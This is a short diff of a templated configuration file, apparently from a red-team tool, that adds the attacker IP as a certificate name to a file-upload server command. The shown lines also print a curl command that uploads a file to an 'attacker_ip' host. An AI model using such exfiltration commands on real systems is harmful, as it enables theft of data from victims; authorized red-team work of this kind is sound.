@@ -18,4 +18,4 @@ content: |
   printf '%s\n' '                         ----Linux----                          '; \
   printf '%s\n' 'Upload data: curl -v -k {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload -F "file=@FILE"'; \
   printf '%s\n' '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_inbound_port }} -d packstation/inbound {{ delivery_tls_flag }}
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_inbound_port }} -d packstation/inbound {{ delivery_tls_flag }} --san {{ attacker_ip }}
